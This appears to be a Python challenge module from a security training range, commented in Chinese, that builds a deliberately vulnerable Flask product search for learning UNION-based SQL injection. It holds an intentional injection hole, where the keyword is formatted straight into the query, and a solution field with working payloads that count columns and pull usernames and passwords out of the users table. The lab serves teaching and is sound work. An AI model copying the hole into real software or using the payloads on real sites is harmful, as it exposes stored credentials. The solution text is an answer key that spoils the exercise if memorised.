"""商品搜索处的 UNION 联合查询注入。

跟第一道 SQLi 题（登录绕过）的区别在这两处：

  · **不显示数据库报错**，也不告诉你"密码错了"
  · 页面只给你一张商品表格 —— 你得用 UNION 把别的表的数据"接"到这张表上带出来

所以要学的东西完全不同：上一题是"闭合引号 + 注释"，这一题是"数清楚列、找显示位、
把目标表 UNION 上去"。
"""

import sqlite3

from vuln4all import Vuln, render_template, request

#: admin 的密码。这一题要你把它从 users 表里读出来。
SENTINEL = "S3cr3t-1nj3ct3d"

#: 两个目标分开记。
#:
#: 为什么不合成一个"结果里出现了非商品行"就完事：那样 `UNION SELECT 1,2,3`
#: （也就是提示里教你找显示位的那一步）就直接算通关了，这题的三步阶梯
#: 会塌成两步 —— 学习者可以一次都不碰 users 表。
#:
#: 所以第一段只认"UNION 接上了"，第二段要求**真的把密码取出来并提交**。
#: 这样用 hex()、substr()、CAST() 那些写法取数的人也不会被漏判。
GOAL_LEAK = "让商品列表里出现了不属于商品表的行（UNION 接上了）"
GOAL_PASSWORD = "把 admin 的密码取出来并提交"


class UnionQuery(Vuln):
    info = {
        "name": "商品搜索处的 UNION 注入",
        "author": ["guaidao2"],
        "cwe": "CWE-89",
        "owasp": "A03:2021 - Injection",
        "difficulty": "进阶",
        "description": (
            "搜索框把关键词拼进了 SQL。这一次页面不给你任何报错，"
            "只回一张商品表格 —— 你得靠自己数清楚这条查询有几列、"
            "哪几列会显示出来，然后用 UNION 把 users 表接到后面。"
        ),
        "hint": (
            "先用一个能搜到东西的关键词（比如「键盘」）确认页面正常。\n"
            "第一件事是数清楚这条查询有几列：SQL 的 ORDER BY 可以传列号，"
            "列号超出范围整条语句就会失败。用一个搜得到东西的关键词，"
            "依次试 ORDER BY 1、2、3、4…… 直到页面突然空掉，就说明列数是多少。\n"
            "第二件事是找「显示位」：把每一个位置都填成数字，看哪几个数字出现在页面上。\n"
            "第三件事才是 UNION 接表。"
        ),
        "solution": (
            "一、数清楚列数（用一个搜得到东西的关键词，比如「键盘」）：\n"
            "   键盘' ORDER BY 1 -- \n"
            "   键盘' ORDER BY 2 -- \n"
            "   键盘' ORDER BY 3 -- \n"
            "   键盘' ORDER BY 4 --      ← 这一步页面空了，说明只有 3 列\n\n"
            "二、找显示位。把每个位置都填成数字，看哪几个数字被渲染出来：\n"
            "   键盘' UNION SELECT 1,2,3 -- \n\n"
            "三、把 users 表接上去（列数要跟第一步数出来的一致）：\n"
            "   键盘' UNION SELECT username, password, role FROM users -- \n"
            "   admin 的密码就会出现在商品列表里 —— 那一行并不是商品。\n\n"
            "四、把读到的密码提交到页面下面的框里。\n\n"
            "常见坑：\n"
            "  · 列数不对 → 整条语句失败 → 页面空白（这题不给你报错，只能靠 ORDER BY 数）\n"
            "  · UNION 前后列的类型不一定要一致，SQLite 是弱类型，填数字占位就行\n"
            "  · 注释符用的是 -- （最后要有一个空格），也可以试 #（SQLite 不支持）\n"
            "  · 光让列表里多出几行不算通关，得真的把 users 的值取出来"
        ),
        "refs": [
            "https://portswigger.net/web-security/sql-injection/union-attacks",
            "https://owasp.org/Top10/A03_2021-Injection/",
        ],
    }

    # ------------------------------------------------------------ 生命周期

    def setup(self, ctx):
        con = sqlite3.connect(str(ctx.workspace / "shop.db"))
        con.executescript(
            """
            CREATE TABLE products (
                id    INTEGER PRIMARY KEY AUTOINCREMENT,
                name  TEXT NOT NULL,
                price REAL NOT NULL
            );
            INSERT INTO products (name, price) VALUES
                ('机械键盘',     499.0),
                ('显示器',      1299.0),
                ('人体工学椅',  1888.0),
                ('鼠标垫',        39.0),
                ('无线鼠标',     129.0);

            CREATE TABLE users (
                id       INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT NOT NULL,
                password TEXT NOT NULL,
                role     TEXT NOT NULL
            );
            INSERT INTO users (username, password, role) VALUES
                ('admin', '%s', 'admin'),
                ('alice', 'alice-is-not-the-target', 'user');
            """
            % SENTINEL
        )
        con.commit()
        con.close()

    # ---------------------------------------------------------------- 应用

    def create_app(self, ctx):
        app = ctx.flask(__name__)
        db_path = str(ctx.workspace / "shop.db")

        def search(sql):
            con = sqlite3.connect(db_path)
            try:
                return con.execute(sql).fetchall()
            finally:
                con.close()

        @app.route("/", methods=["GET", "POST"])
        def index():
            keyword = ""
            rows = []
            leaked = False
            feedback = None

            if request.method == "POST" and "keyword" in request.form:
                keyword = request.form.get("keyword", "")

                # ↓↓↓ 洞就在这里：关键词直接拼进 SQL ↓↓↓
                sql = (
                    "SELECT id, name, price FROM products "
                    "WHERE name LIKE '%{}%'".format(keyword)
                )
                # ↑↑↑ 正确做法：con.execute("... WHERE name LIKE ?", ('%' + kw + '%',)) ↑↑↑

                try:
                    rows = search(sql)
                except sqlite3.Error:
                    # 故意什么都不说。这一题要你自己数清楚列数 ——
                    # 给了报错就等于把答案送出去了。
                    rows = []

                # 目标一的判定：结果里出现了**不属于商品表**的行。
                # 这说明 UNION 接上了 —— 但**还不等于通关**，见下面 GOAL_PASSWORD。
                try:
                    genuine = {
                        (row[0], row[1], row[2])
                        for row in search("SELECT id, name, price FROM products")
                    }
                except sqlite3.Error:
                    # 这条辅助查询挂了不该把整个请求变成 500 ——
                    # 外面那层是刻意"什么都不说"的，这里就得自己兜住。
                    genuine = set()
                leaked = any(tuple(row) not in genuine for row in rows)
                if leaked:
                    ctx.progress.mark(GOAL_LEAK)

            elif request.method == "POST":
                # 第二个表单：提交取出来的密码
                guess = request.form.get("guess", "").strip()
                if guess:
                    if guess == SENTINEL:
                        ctx.progress.mark(GOAL_PASSWORD)
                        feedback = ("ok", "密码对了。")
                    else:
                        feedback = ("bad", "不对。回到列表里去取。")

            return render_template(
                "index.html",
                keyword=keyword,
                rows=rows,
                leaked=leaked,
                feedback=feedback,
            )

        return {"": app}

    # ---------------------------------------------------------------- 进度

    def check(self, ctx):
        return {
            GOAL_LEAK: ctx.progress.achieved(GOAL_LEAK),
            GOAL_PASSWORD: ctx.progress.achieved(GOAL_PASSWORD),
        }
